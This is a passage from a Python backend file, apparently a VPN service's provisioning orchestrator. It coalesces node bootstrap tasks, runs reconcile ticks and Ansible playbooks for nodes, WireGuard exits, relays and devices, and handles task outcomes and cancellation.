                        )
                    ),
                )
                .order_by(models.ProvisioningTask.id.desc())
                .first()
            )

        def _flag(active_task: models.ProvisioningTask) -> bool:
            # Status-checked атомарный set: True ТОЛЬКО если таска всё ещё
            # активна. Если она финишировала между _find_active и этим UPDATE
            # (0 строк) — НЕ ставим флаг на терминальную строку (иначе worker
            # его не подхватит и правка потеряется — review TOCTOU lost-rerun),
            # а проваливаемся в INSERT свежего bootstrap'а.
            return bool(
                self.db.query(models.ProvisioningTask)
                .filter(
                    models.ProvisioningTask.id == active_task.id,
                    models.ProvisioningTask.status.in_(
                        (
                            models.ProvisioningTaskStatus.pending,
                            models.ProvisioningTaskStatus.running,
                        )
                    ),
                )
                .update(
                    {models.ProvisioningTask.rerun_requested: True},
                    synchronize_session=False,
                )
            )

        active = _find_active()
        if active is not None and _flag(active):
            self.db.flush()
            return active, False

        try:
            with self.db.begin_nested():
                task = models.ProvisioningTask(
                    target_type="node",
                    target_id=node.id,
                    action="bootstrap",
                    payload=payload or {},
                    status=models.ProvisioningTaskStatus.pending,
                    batch_id=batch_id,
                )
                self.db.add(task)
                self.db.flush()  # тут триггерится uq_active_node_bootstrap при гонке
            return task, True
        except IntegrityError:
            # Проиграли гонку — активный bootstrap создал другой запрос.
            active = _find_active()
            if active is not None and _flag(active):
                self.db.flush()
                return active, False
            # Крайне редкий зазор: индекс сработал, но активного уже нет
            # (успел финишировать между insert и re-query) — создаём обычно.
            return (
                self.create_task(
                    "node", node.id, "bootstrap", payload, batch_id=batch_id
                ),
                True,
            )

    def _enqueue_bootstrap_rerun(
        self, node: models.VPNNode, finished_task: models.ProvisioningTask
    ) -> None:
        """Phase-0: на финише bootstrap'а с ``rerun_requested`` создаём РОВНО
        один свежий bootstrap (правки, прилетевшие во время прогона). Старая
        таска уже терминальна → unique index свободен. Свежая стартует с
        rerun_requested=False, так что бесконечного цикла нет."""
        payload = dict(finished_task.payload or {})
        payload["rerun"] = True
        fresh, created = self.create_or_coalesce_node_bootstrap(
            node, payload, defer_to_reconciler=False
        )
        self.db.commit()
        if created:
            logger.info(
                "Coalesce rerun: node %s → свежий bootstrap task %s",
                node.id, fresh.id,
            )
            self.run_task_async(fresh, node=node)

    def reconcile_due_nodes(self) -> dict[str, Any]:
        """Phase 3 reconcile-тик: сходит ноды, у которых reconcile_due_at
        наступил И desired_generation > reconciled_generation — ОДНИМ coalesced
        bootstrap'ом, помеченным целевым generation (reconcile_gen). На успехе
        reconciled = gen; на фейле due_at re-arm'ится с backoff (см.
        _handle_task_outcome). No-op если RECONCILER_ENABLED выключен.

        Ноды с уже активным (pending|running) bootstrap'ом ИСКЛЮЧАЕМ из выборки
        (NOT EXISTS): иначе они — с самым ранним due_at — занимали бы окно капа
        на каждом тике (created=False, dispatched=0) и морили бы голодом ждущие
        ноды (review: cap-starvation), а тик ещё и коалесился бы на свой же
        in-flight bootstrap, плодя лишний прогон (review: spurious-rerun). due_at
        в тике НЕ чистим — им управляет outcome-хэндлер: успех → None (сошлись)
        либо оставлен (supersession, desired обогнал), фейл → now+backoff. Пока
        bootstrap бежит, нода невидима тику; на терминале outcome перевыставит
        due_at, и СЛЕДУЮЩИЙ тик (active-bootstrap'а уже нет) задиспатчит свежий
        прогон с актуальным gen.

        Phase 4: за один тик диспатчим максимум RECONCILE_MAX_PER_TICK нод
        (default 15), отсортированных по reconcile_due_at ASC (дольше всех
        ждавшие — первыми, FIFO-справедливость). Остальные созревшие подождут
        следующего тика (RECONCILE_INTERVAL=3s). Это back-pressure против
        thundering herd при bulk-правке (50 нод сразу): семафор всё равно
        пускает MAX_CONCURRENT_ANSIBLE параллельно, но кап не плодит лишние
        pending-строки впереди ёмкости. Берём limit+1, чтобы честно
        репортить ``capped`` (есть ли ещё созревшие сверх капа), не считая
        второй COUNT."""
        if not self._reconciler_enabled():
            return {"reconciler": "disabled"}
        now = utcnow()
        max_per_tick = max(1, int(os.getenv("RECONCILE_MAX_PER_TICK", "15")))
        # Коррелированный NOT EXISTS: нода уже имеет активный bootstrap (его
        # держит Phase-0 unique index uq_active_node_bootstrap, ≤1 на ноду) →
        # новый прогон сейчас не нужен/не возможен, исключаем из окна капа.
        active_bootstrap = (
            self.db.query(models.ProvisioningTask.id)
            .filter(
                models.ProvisioningTask.target_type == "node",
                models.ProvisioningTask.target_id == models.VPNNode.id,
                models.ProvisioningTask.action == "bootstrap",
                models.ProvisioningTask.status.in_(
                    (
                        models.ProvisioningTaskStatus.pending,
                        models.ProvisioningTaskStatus.running,
                    )
                ),
            )
            .exists()
        )
        rows = (
            self.db.query(models.VPNNode)
            .filter(
                models.VPNNode.reconcile_due_at.isnot(None),
                models.VPNNode.reconcile_due_at <= now,
                models.VPNNode.desired_generation
                > models.VPNNode.reconciled_generation,
                ~active_bootstrap,
            )
            .order_by(models.VPNNode.reconcile_due_at.asc())
            .limit(max_per_tick + 1)
            .all()
        )
        capped = len(rows) > max_per_tick
        due = rows[:max_per_tick]
        dispatched = 0
        for node in due:
            gen = node.desired_generation  # фиксируем целевой generation
            try:
                task, created = self.create_or_coalesce_node_bootstrap(
                    node,
                    {
                        "pool_id": node.pool_id,
                        "reconcile_gen": gen,
                        "reconcile": True,
                    },
                    defer_to_reconciler=False,
                )
                self.db.commit()
                if created and task is not None:
                    self.run_task_async(task, node=node)
                    dispatched += 1
            except Exception:  # noqa: BLE001
                logger.exception("reconcile: node %s dispatch failed", node.id)
                self.db.rollback()
        if capped:
            logger.info(
                "reconcile: capped at %s node(s)/tick — ещё созревшие ждут "
                "следующего тика", max_per_tick,
            )
        # Watchdog: сколько нод ждут reconcile и насколько просрочена самая
        # старая. run_reconcile_tick экспортит это гейджами — если scheduler
        # завис, гейдж перестаёт обновляться (staleness-alert ловит wedge,
        # который не виден изнутри тика), а растущий oldest_overdue ловит
        # cap-starvation или повторно падающий bootstrap. Пользователь принял
        # зависимость свежей ноды от здоровья тика (вариант C) — это страховка
        # сверху к self-heal stale-лока на старте воркера (commit 7bf697a).
        pending_total = (
            self.db.query(func.count(models.VPNNode.id))
            .filter(
                models.VPNNode.desired_generation
                > models.VPNNode.reconciled_generation
            )
            .scalar()
        ) or 0
        oldest_due = (
            self.db.query(func.min(models.VPNNode.reconcile_due_at))
            .filter(
                models.VPNNode.desired_generation
                > models.VPNNode.reconciled_generation,
                models.VPNNode.reconcile_due_at.isnot(None),
                models.VPNNode.reconcile_due_at <= now,
            )
            .scalar()
        )
        oldest_overdue_s = (
            (now - oldest_due).total_seconds() if oldest_due else 0.0
        )
        warn_s = float(os.getenv("RECONCILE_OVERDUE_WARN_S", "120"))
        if oldest_overdue_s > warn_s:
            logger.warning(
                "reconcile: %s node(s) pending, oldest overdue by %.0fs "
                "(>%.0fs warn) — тик не успевает сходить ноды или bootstrap "
                "повторно падает", pending_total, oldest_overdue_s, warn_s,
            )
        return {
            "due": len(due),
            "dispatched": dispatched,
            "capped": capped,
            "pending_total": pending_total,
            "oldest_overdue_s": oldest_overdue_s,
        }

    def _mark_task(
        self,
        task: models.ProvisioningTask,
        status: models.ProvisioningTaskStatus,
        *,
        error: str | None = None,
        result: dict[str, Any] | None = None,
    ) -> None:
        task.status = status
        task.error_message = error
        task.result = result
        task.finished_at = utcnow()
        self.db.add(task)
        self.db.commit()
        TASK_STATUS_COUNTER.labels(status=status.value).inc()

    def _is_cancel_requested(self, task_id: int) -> bool:
        """Свежая короткая сессия — видеть cancel_requested_at, выставленный
        API в ДРУГОЙ сессии, не трогая транзакцию идущего таска. На ошибке БД
        возвращаем False (лучше доделать прогон, чем оборвать на мигании БД)."""
        try:
            with SessionLocal() as s:
                return (
                    s.query(models.ProvisioningTask.cancel_requested_at)
                    .filter(models.ProvisioningTask.id == task_id)
                    .scalar()
                ) is not None
        except Exception:  # noqa: BLE001
            return False

    def run_task(
        self, task: models.ProvisioningTask, node: models.VPNNode | None = None
    ) -> models.ProvisioningTask:
        # Phase 1: оператор мог отменить таску, пока она ждала в очереди —
        # не запускаем ansible, помечаем cancelled и выходим.
        if task.cancel_requested_at is not None:
            # Отмена ≠ поломка: НЕ зовём _handle_task_outcome (он бы демотил
            # ноду в error / обнулял health_score). Просто помечаем cancelled.
            self._mark_task(
                task, models.ProvisioningTaskStatus.cancelled,
                error="cancelled before start",
            )
            return task

        task.started_at = utcnow()
        task.status = models.ProvisioningTaskStatus.running
        self.db.commit()

        # Активный cancel_check для run_playbook'ов этого таска (poll→SIGTERM).
        # Ставится thread-local'но, перезаписывается на старте каждого run_task,
        # так что между тасками не утекает.
        set_active_cancel_check(lambda: self._is_cancel_requested(task.id))

        result_payload: dict[str, Any] | None = None
        try:
            result_payload = self._execute_task(task, node=node)
        except AnsibleCancelled as exc:
            # Отмена ≠ поломка — ноду не демотим (см. pre-start ветку выше).
            self._mark_task(
                task, models.ProvisioningTaskStatus.cancelled,
                error="cancelled by operator (SIGTERM)",
                result={"stdout": exc.stdout, "stderr": exc.stderr},
            )
            return task
        except Exception as exc:  # noqa: BLE001
            # Unexpected error BEFORE or AFTER ansible (setup/teardown,
            # inventory build, semaphore, etc). Ansible non-zero exit is
            # *not* raised here anymore — _execute_task returns the payload
            # with returncode and we branch below, so the stdout is always
            # visible in the Tasks UI.
            logger.exception("Provisioning task %s failed", task.id)
            self._mark_task(
                task, models.ProvisioningTaskStatus.failed,
                error=str(exc), result=result_payload,
            )
            self._handle_task_outcome(task, success=False)
            return task

        rc = (result_payload or {}).get("returncode", 0)
        if rc != 0:
            # Ansible exited non-zero. Previously we raised RuntimeError
            # with only stderr, which for UNREACHABLE hosts is a single
            # [WARNING] line while the real "Permission denied" output
            # lives in stdout. Keep the full payload so /admin/tasks can
            # show stdout+stderr+rc in the result pane.
            stderr = (result_payload or {}).get("stderr") or ""
            stdout = (result_payload or {}).get("stdout") or ""
            # Prefer the last few non-empty lines of stdout/stderr as the
            # summary — that's where ansible writes the PLAY RECAP and the
            # fatal: block. Full output stays in result.
            tail_source = stderr.strip() or stdout.strip()
            tail = "\n".join(tail_source.splitlines()[-20:]) if tail_source else (
                f"ansible exited with rc={rc}"
            )
            self._mark_task(
                task, models.ProvisioningTaskStatus.failed,
                error=tail, result=result_payload,
            )
            self._handle_task_outcome(task, success=False)
            return task

        self._mark_task(task, models.ProvisioningTaskStatus.success, result=result_payload)
        self._handle_task_outcome(task, success=True)
        return task

    def run_task_async(
        self, task: models.ProvisioningTask, node: models.VPNNode | None = None
    ) -> None:
        """Dispatch a provisioning task off the request thread via RQ."""
        from ..queue import enqueue_task

        job_id = enqueue_task(task.id, node.id if node else None)
        if job_id:
            logger.info("Task %s enqueued as RQ job %s", task.id, job_id)
            return

        if os.getenv("ALLOW_INPROCESS_PROVISIONING", "").lower() not in {"1", "true", "yes"}:
            raise RuntimeError(
                "Provisioning queue is unavailable and ALLOW_INPROCESS_PROVISIONING is not set"
            )

        thread = threading.Thread(
            target=self._run_task_in_new_session,
            args=(task.id, node.id if node else None),
            daemon=True,
        )
        thread.start()

    def _run_task_in_new_session(self, task_id: int, node_id: int | None = None) -> None:
        session = SessionLocal()
        try:
            orchestrator = ProvisioningOrchestrator(session)
            task = session.get(models.ProvisioningTask, task_id)
            if not task:
                logger.error("Provisioning task %s not found for async execution", task_id)
                return

            node: models.VPNNode | None = None
            if node_id:
                node = session.get(models.VPNNode, node_id)
            elif task.target_type == "device":
                device = session.get(models.Device, task.target_id)
                if device:
                    node = device.config.node if device.config else device.subscription.node

            orchestrator.run_task(task, node=node)
        except Exception as exc:  # noqa: BLE001
            logger.exception("Async provisioning task %s failed before completion", task_id)
            if session.is_active:
                session.rollback()
            try:
                task = session.get(models.ProvisioningTask, task_id)
                if task:
                    orchestrator = ProvisioningOrchestrator(session)
                    orchestrator._mark_task(  # noqa: SLF001
                        task, models.ProvisioningTaskStatus.failed, error=str(exc),
                    )
            except Exception:  # noqa: BLE001
                logger.exception("Failed to mark task %s as failed", task_id)
                session.rollback()
        finally:
            session.close()

    def reset_failed_task(self, task: models.ProvisioningTask) -> None:
        task.status = models.ProvisioningTaskStatus.pending
        task.error_message = None
        task.result = None
        task.started_at = None
        task.finished_at = None
        self.db.add(task)
        self.db.commit()

    def requeue_task(
        self, task: models.ProvisioningTask
    ) -> models.ProvisioningTask:
        """Safely (re)dispatch a task. Возвращает таску, которая реально
        побежит (для node-bootstrap может быть СВЕЖАЯ coalesced-таска).

        Для node-bootstrap НЕЛЬЗЯ воскрешать терминальную строку в pending —
        она снова войдёт в uq_active_node_bootstrap и, если рядом уже есть
        активный bootstrap, commit упадёт IntegrityError (review: rerun_task
        resurrect → 500 + batch poison). Поэтому:
          * активную (pending|running) — просто (ре)диспатчим (RQ дедупит по
            job_id, second-run не будет);
          * терминальную — гоним через coalesce → свежий bootstrap либо флаг
            на живом.
        Прочие типы тасок — прежнее resurrect-in-place.
        """
        node = (
            self.db.get(models.VPNNode, task.target_id)
            if task.target_type == "node"
            else None
        )
        if task.target_type == "node" and task.action == "bootstrap":
            if task.status in (
                models.ProvisioningTaskStatus.pending,
                models.ProvisioningTaskStatus.running,
            ):
                self.run_task_async(task, node=node)
                return task
            if node is None:
                return task  # ноды нет — бутстрапить нечего
            rerun_payload = dict(task.payload or {}, rerun=True)
            # review: stale-gen — терминальный reconcile-bootstrap несёт gen
            # СВОЕГО прогона; при ручном requeue пере-штампуем актуальным desired,
            # иначе success не продвинет reconciled до текущего desired и тик
            # будет гонять повторы, пока supersession не сойдётся.
            if "reconcile_gen" in rerun_payload:
                self.db.refresh(node, ["desired_generation"])
                rerun_payload["reconcile_gen"] = node.desired_generation
            fresh, created = self.create_or_coalesce_node_bootstrap(
                node, rerun_payload,
                defer_to_reconciler=False,
            )
            self.db.commit()
            if created:
                self.run_task_async(fresh, node=node)
            return fresh
        # non-bootstrap: resurrect-in-place (на них unique-index не действует)
        if task.status in (
            models.ProvisioningTaskStatus.failed,
            models.ProvisioningTaskStatus.success,
        ):
            self.reset_failed_task(task)
        self.run_task_async(task, node=node)
        return task

    def _handle_task_outcome(self, task: models.ProvisioningTask, *, success: bool) -> None:
        # ── Node-level outcome: flip registering → active on success ──
        #
        # Bootstrap/re-bootstrap tasks are how a freshly-spawned node
        # proves it can host traffic. Until check_node_health passes
        # the node stays in "registering" and the scheduler refuses
        # to hand it subscriptions; on success we promote it, on
        # failure we mark it unhealthy (but keep it around for rerun).
        if task.target_type == "node":
            node = self.db.get(models.VPNNode, task.target_id)
            if not node:
                return
            # Resync tasks are a post-site.yml helper — they neither
            # promote a registering node nor demote an already-active
            # one, so bypass the status transitions entirely. Errors are
            # visible via the task row.
            if task.action == "resync_vless":
                return
            # Diagnose is READ-ONLY (staged probe + read-only on-host play).
            # A FAILED probe of a temporarily-unreachable node must NOT zero
            # health_score / flip registering→error (that pulls a live node
            # out of selection), and a SUCCESSFUL one must NOT promote +
            # fire a full resync_node_clients. The reachability tick auto-
            # enqueues node diagnose on every outage, so without this guard a
            # routine probe would demote healthy nodes. Mirrors the exit
            # branch below + the diagnose_node endpoint's "without touching
            # configs" contract.
            if task.action == "diagnose":
                return
            if success:
                node.status = models.VPNNodeStatus.active
                node.last_health_check_at = utcnow()
                # Auto-trigger a vless-family resync after any successful
                # node-level site.yml run. install_vless_reality has
                # slurp+re-inject and install_vless_xhttp/ws_cdn now do
                # too, but that only covers the happy path (old config
                # exists and parses). On first bootstrap, after a manual
                # wipe, or when the template re-render raced with the
                # helper script, previously-active subs get "invalid
                # request user id" until we re-add them. The resync is
                # idempotent (manage_vless_*_user.sh drops duplicates by
                # email) so running it on every success is cheap and
                # keeps the node in a known-good state. Skipped for
                # nodes that don't serve any vless-family protocol
                # (pure ShadowTLS nodes need nothing here).
                if _node_has_vless_family(node):
                    try:
                        self.resync_node_clients(node)
                    except Exception:  # noqa: BLE001
                        logger.exception(
                            "Auto-resync after site.yml failed for node %s",
                            node.id,
                        )
            else:
                # Don't downgrade an already-active node's status on a
                # transient rerun failure — existing users need to stay
                # connected. Only freshly-registering nodes get marked
                # failed. But DO zero out health_score (#64) so the
                # autoscale selector stops assigning new users to this
                # node until it recovers.
                if node.status == models.VPNNodeStatus.registering:
                    node.status = models.VPNNodeStatus.error
                else:
                    node.health_score = 0
            self.db.add(node)
            self.db.commit()
            # Phase 3: продвигаем reconciled_generation / reconcile_due_at для
            # reconcile-bootstrap'ов ОДНИМ conditional SQL UPDATE по ЖИВОЙ строке
            # (НЕ read-modify-write по ORM-снимку). Иначе правка из другой сессии
            # (mark_node_dirty: desired+1 И due_at=now+debounce одним UPDATE)
            # могла прилететь между нашим re-SELECT и commit'ом, и мы затёрли бы
            # её due_at в NULL по устаревшему desired==reconciled → нода навсегда
            # выпадает из выборки тика (review: lost-update, CRITICAL). CASE на
            # ЖИВОМ desired_generation гарантирует: due_at чистим в NULL ТОЛЬКО
            # если desired не обогнал новый reconciled; иначе оставляем due_at как
            # есть — re-arm правки (или supersession) цел. В Postgres все ссылки
            # на колонки в SET/CASE = OLD-значения строки, поэтому GREATEST(...) и
            # сравнение согласованы и идемпотентны под RQ-retry.
            _rgen = (task.payload or {}).get("reconcile_gen")
            if _rgen is not None and task.action == "bootstrap":
                if success:
                    new_reconciled = func.greatest(
                        models.VPNNode.reconciled_generation, int(_rgen)
                    )
                    self.db.query(models.VPNNode).filter(
                        models.VPNNode.id == node.id
                    ).update(
                        {
                            models.VPNNode.reconciled_generation: new_reconciled,
                            models.VPNNode.reconcile_due_at: case(
                                (
                                    models.VPNNode.desired_generation
                                    > new_reconciled,
                                    models.VPNNode.reconcile_due_at,
                                ),
                                else_=None,
                            ),
                        },
                        synchronize_session=False,
                    )
                else:
                    self.db.query(models.VPNNode).filter(
                        models.VPNNode.id == node.id
                    ).update(
                        {
                            models.VPNNode.reconcile_due_at: utcnow()
                            + timedelta(
                                seconds=float(os.getenv("RECONCILE_RETRY_S", "60"))
                            )
                        },
                        synchronize_session=False,
                    )
                self.db.commit()
            # Phase-0 coalescing: атомарно claim+clear rerun_requested одним
            # UPDATE ... WHERE rerun_requested=true. claimed=1 ТОЛЬКО если флаг
            # реально стоял на момент UPDATE (правка прилетела во время прогона,
            # через ДРУГУЮ сессию, и поставила его status-checked'ом). Это:
            #   * закрывает TOCTOU с флаг-сетом (парно с _flag выше — row-lock
            #     сериализует наш _mark_task terminal и их status-checked set);
            #   * делает outcome идемпотентным под RQ-retry/crash-recovery
            #     (повторный проход увидит флаг уже false → claimed=0 → no-op).
            # Свежий bootstrap создаём на успехе И фейле — desired-изменения
            # обязаны примениться.
            #
            # NB (review: spurious-rerun): reconcile-bootstrap'ы (reconcile_gen в
            # payload) в rerun_requested НЕ участвуют — их повтор делает
            # supersession-ветка тика (due_at остаётся вооружённым, пока
            # desired>reconciled). Иначе тик, повторно коалесясь на СВОЙ же
            # in-flight bootstrap (или при overlap двух тиков), выставил бы флаг,
            # и outcome уже-сошедшейся ноды запустил бы лишний полный site.yml.
            if task.action == "bootstrap" and _rgen is None:
                claimed = (
                    self.db.query(models.ProvisioningTask)
                    .filter(
                        models.ProvisioningTask.id == task.id,
                        models.ProvisioningTask.rerun_requested.is_(True),
                    )
                    .update(
                        {models.ProvisioningTask.rerun_requested: False},
                        synchronize_session=False,
                    )
                )
                self.db.commit()
                if claimed:
                    self._enqueue_bootstrap_rerun(node, task)
            return

        # ── Exit-level outcome: same shape as node, with recovery. ──
        if task.target_type == "exit":
            exit_node = self.db.get(models.WGExitNode, task.target_id)
            if not exit_node:
                return
            # Diagnose is read-only (runs a playbook that collects wg
            # show + peers + routes) — it must not mutate status.
            if task.action == "diagnose":
                return
            if success:
                # Unconditionally promote to active. Mirrors node logic:
                # a successful re-bootstrap is the only signal we have
                # that an exit stuck at ``error`` recovered, so the
                # ``error → active`` transition must be allowed. Without
                # this, once an exit ever bounced into error (e.g. the
                # very first bootstrap raced with DNS) it stayed there
                # forever until someone PATCHed it by hand.
                exit_node.status = models.WGExitNodeStatus.active
            else:
                # Don't demote an already-active exit on a transient
                # bootstrap failure — a broken peer-list re-render
                # shouldn't kick every attached relay offline. Only
                # flip registering → error.
                if exit_node.status == models.WGExitNodeStatus.registering:
                    exit_node.status = models.WGExitNodeStatus.error
            self.db.add(exit_node)
            self.db.commit()
            return

        # ── Relay-tunnel outcome: nothing to flip on the DB side ──
        # The relay VPNNode's status is managed by node-level site.yml
        # runs, not by tunnel up/down. An attach failure already shows
        # up in the tasks UI — promoting/demoting the node here would
        # fight with the normal bootstrap flow.
        if task.target_type == "relay_tunnel":
            return

        device = self.db.get(models.Device, task.target_id)
        if not device:
            return

        if success:
            if task.action == "apply":
                # A device can be intentionally retired (disabled/revoked)
                # WHILE its apply task is still queued — e.g.
                # regenerate_subscription_sublink swaps out a still-pending
                # device, or a migrate/freeze revokes one. The retirement is
                # terminal: do NOT resurrect it to active. Reactivating would
                # make it reappear in the ЛК next to its replacement, double-
                # count live devices, and — via change_plan's live-count
                # recompute (balance.py) — overcharge the user. Leave it
                # retired; its UUID lingering on the node is harmless.
                if device.status in (
                    models.DeviceStatus.disabled,
                    models.DeviceStatus.revoked,
                ):
                    logger.info(
                        "apply task %s finished but device %s is already %s "
                        "(retired in-flight) — skipping reactivation",
                        task.id,
                        device.id,
                        device.status.value,
                    )
                    return
                device.status = models.DeviceStatus.active
                for cred in device.credentials:
                    cred.is_active = True
                    cred.revoked_at = None
            elif task.action == "revoke":
                # ╔══════════════════════════════════════════════════════╗
                # ║  DO NOT revert to `db.delete(device)`. See            ║
                # ║  docs/components/backend-api.md "Sub-link invariant". ║
                # ║                                                       ║
                # ║  Deleting the Device row wipes its sub_token, which   ║
                # ║  breaks every saved Hiddify/v2rayN URL pointing at    ║
                # ║  it — every migration becomes "bot, send me the new   ║
                # ║  URI". Keeping the row + marking status=revoked lets  ║
                # ║  /api/sub/{token} alias to a live sibling on the      ║
                # ║  same Sub (see dynamic_sub_link in api_extensions).   ║
                # ║                                                       ║
                # ║  Read paths already filter revoked rows out of the    ║
                # ║  UI (_live_device_count in balance.py, live_device_   ║
                # ║  rows in api_webapp.py) so the admin card stays tidy. ║
                # ╚══════════════════════════════════════════════════════╝
                device.status = models.DeviceStatus.revoked
                device.updated_at = utcnow()
                for cred in device.credentials:
                    cred.is_active = False
                    cred.revoked_at = cred.revoked_at or utcnow()
                self.db.add(device)
                self.db.commit()
                return
        else:
            device.status = models.DeviceStatus.failed
        device.updated_at = utcnow()
        self.db.add(device)
        self.db.commit()

        # ── Post-provision callback: notify bot ──
        if success and task.action == "apply":
            self._notify_bot_config_ready(device)

    def _notify_bot_config_ready(self, device: models.Device) -> None:
        """Push a notification to the bot that config is ready for delivery.

        We POST to the backend's internal /api/bot/notify_config endpoint,
        which the bot polls or which triggers a direct Telegram message.
        Instead of coupling worker→bot, we write a lightweight callback
        record that the bot's polling loop picks up.
        """
        try:
            sub = device.subscription
            if not sub:
                return
            user = sub.user
            if not user or not user.telegram_id:
                return
            # Store the notification in the task result so the bot can read it
            # via the existing task polling mechanism, or via the new callback API.
            task_result = (
                self.db.query(models.ProvisioningTask)
                .filter(
                    models.ProvisioningTask.target_type == "device",
                    models.ProvisioningTask.target_id == device.id,
                    models.ProvisioningTask.action == "apply",
                    models.ProvisioningTask.status == models.ProvisioningTaskStatus.success,
                )
                .order_by(models.ProvisioningTask.id.desc())
                .first()
            )
            if task_result and task_result.result:
                result = dict(task_result.result)
                result["_notify"] = {
                    "telegram_id": user.telegram_id,
                    "subscription_id": sub.id,
                    "device_id": device.id,
                }
                task_result.result = result
                self.db.add(task_result)
                self.db.commit()
        except Exception:  # noqa: BLE001
            logger.exception("Failed to store bot notification for device %s", device.id)

    def _execute_task(
        self, task: models.ProvisioningTask, node: models.VPNNode | None = None
    ) -> dict[str, Any]:
        payload = task.payload or {}
        _ansible_semaphore.acquire()
        inventory = None
        try:
            if task.target_type == "node":
                if not node:
                    node = self.db.get(models.VPNNode, task.target_id)
                if not node:
                    raise RuntimeError("VPN node not found for provisioning")
                inventory = build_inventory_for_node(node)
                if task.action == "resync_vless":
                    # Lightweight follow-up to site.yml: re-add every
                    # known vless-family credential (reality/xhttp/ws_cdn)
                    # via the node's manage_vless_*_user.sh helpers so
                    # users survive a config re-render or manual
                    # /usr/local/etc/xray/config*.json wipe. Payload is
                    # already the full per-protocol client map, built
                    # by resync_node_clients().
                    result = run_playbook(
                        "playbooks/resync_node.yml",
                        inventory,
                        limit=node.name,
                        extra_vars=payload,
                    )
                elif task.action == "diagnose":
                    # Staged: controller→host probe (ping/tcp/ssh) first; the
                    # on-host play runs only if ssh is reachable, else we
                    # short-circuit to a skip-checklist instead of burning an
                    # ansible UNREACHABLE. The helper owns its own inventory.
                    result = self._run_node_diagnose(task, node, payload)
                else:
                    # Cloud-ноды без инъекции SSH-ключа (4vps): кладём наш
                    # provisioning-ключ по root-паролю ПЕРЕД site.yml, иначе
                    # ansible не зайдёт (Permission denied (publickey,password)).
                    # Best-effort + идемпотентно; после первого bootstrap'а
                    # password-auth отключается → повторная попытка просто
                    # отвалится (ключ уже стоит). Никогда не валит bootstrap.
                    if node.provider_root_password_enc:
                        from ..security import decrypt
                        from .ssh_bootstrap import ensure_provisioning_key
                        try:
                            ensure_provisioning_key(
                                node.host,
                                decrypt(node.provider_root_password_enc) or "",
                                port=node.ssh_port or 22,
                            )
                        except Exception:  # noqa: BLE001
                            logger.exception(
                                "provisioning-key bootstrap failed for node %s "
                                "(continuing — ansible will retry)", node.id,
                            )
                    site_vars = _collect_site_extra_vars(self.db, node)
                    # 900s (15мин) потому что site.yml на свежей relay/jump-ноде
                    # гонит подряд bootstrap_node + install_vless_reality +
                    # install_vless_xhttp (certbot/ACME) + relay_jump_node (wg)
                    # + traffic_collector + probe_agent + sharing_enforcer +
                    # check_node_health. Дефолт ANSIBLE_PLAYBOOK_TIMEOUT=300
                    # мал — на первом прогоне xray-download + certbot съедают
                    # больше половины. Exit/relay_tunnel уже идут на 600, site
                    # делает строго больше работы → 900 с запасом.
                    result = run_playbook(
                        "site.yml",
                        inventory,
                        limit=node.name,
                        extra_vars=site_vars,
                        timeout=900,
                    )
            elif task.target_type == "exit":
                # Stage E — bootstrap/re-bootstrap a WG exit node. Same
                # task type is used for first-time install (peers=[]) and
                # for every subsequent peer-list change; the role is
                # idempotent (wg syncconf on the running interface).
                exit_node = self.db.get(models.WGExitNode, task.target_id)
                if not exit_node:
                    raise RuntimeError("WG exit node not found for provisioning")
                inventory = build_inventory_for_exit_node(exit_node)
                exit_vars = _collect_exit_extra_vars(self.db, exit_node)
                if task.action == "diagnose":
                    # Read-only probe — staged controller→host reachability
                    # (ping/tcp/ssh) first, then on-host wg show + systemd +
                    # listen-port assertion ONLY if ssh is reachable. The
                    # helper owns its own inventory + extra_vars. Status
                    # callback skips diagnose so it can't flip exit status.
                    result = self._run_exit_diagnose(task, exit_node, payload)
                else:
                    result = run_playbook(
                        "playbooks/bootstrap_exit.yml",
                        inventory,
                        limit=exit_node.name,
                        extra_vars=exit_vars,
                        timeout=600,
                    )
            elif task.target_type == "relay_tunnel":
                relay = self.db.get(models.VPNNode, task.target_id)
                if not relay:
                    raise RuntimeError("Relay VPN node not found for provisioning")

                if task.action == "diagnose":
                    # Read-only WG link diagnostics — handled in a separate
                    # helper that runs `diagnose_relay_link.yml`, reads the
                    # structured JSON the role writes on the controller, and
                    # returns a `SimpleNamespace` with `.checks` so the
                    # outer return-dict picks it up alongside stdout/rc.
                    # _handle_task_outcome for relay_tunnel is a no-op, so
                    # diagnose can't accidentally flip any DB state.
                    result = self._run_relay_link_diagnose(task, relay, payload)
                else:
                    # Stage E — reconcile the WireGuard client side of a
                    # relay jump node. Runs two playbooks sequentially so an
                    # attach/detach produces a consistent state across both
                    # ends in a single task:
                    #   1) bootstrap_exit.yml on the current (or formerly
                    #      attached) exit — re-renders its peer list so the
                    #      relay is added/removed from the server config.
                    #   2) relay_tunnel_apply.yml on the relay itself —
                    #      brings wg0 up + patches Xray when relay_config is
                    #      set; tears both down when it isn't (detach path).
                    #
                    # ``exit_id`` is carried on task.payload because detach
                    # clears ``relay_config`` before the task fires, so we'd
                    # have no other way to find the exit whose wg0.conf still
                    # holds the now-stale peer line.
                    result = self._run_relay_tunnel_apply(task, relay, payload)
            elif task.target_type == "device":
                # Fallback node resolution: callers that don't pre-load
                # the node (rerun from /admin/tasks, RQ worker with no
                # node_id, etc.) pass ``node=None``. We derive it from
                # the device row itself so every code path produces a
                # valid inventory.
                if not node:
                    device = self.db.get(models.Device, task.target_id)
                    if device:
                        node = (
                            device.config.node if device.config
                            else (device.subscription.node
                                  if device.subscription else None)
                        )
                if not node:
                    raise RuntimeError(
                        "Node is required to provision device "
                        f"(device_id={task.target_id}); "
                        "device has no config/subscription pointing at a node"
                    )
                inventory = build_inventory_for_node(node)
                result = run_playbook(
                    "playbooks/provision_device.yml",
                    inventory, limit=node.name, extra_vars=payload,
                )
            else:
                raise RuntimeError(f"Unsupported target type {task.target_type}")
        finally:
            _ansible_semaphore.release()
            if inventory is not None:
                try:
                    inventory.unlink()
                except OSError:
                    logger.warning("Failed to remove temp inventory %s", inventory)

        # Return full ansible output regardless of exit code. run_task()
        # branches on returncode and marks the task failed without losing
        # stdout — for UNREACHABLE hosts the real error (Permission denied,
        # bad key perms, etc) is in stdout, not stderr.
        #
        # diagnose tasks attach a `.checks` list of structured probe results
        # to the result object (via _run_relay_link_diagnose / SimpleNamespace).
        # Surface it as `checks` field on the task.result JSON so the admin UI
        # can render OK/FAIL cards instead of the raw stdout blob.
        payload: dict[str, Any] = {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "returncode": result.returncode,
        }
        diagnose_checks = getattr(result, "checks", None)
        if diagnose_checks is not None:
            payload["checks"] = diagnose_checks
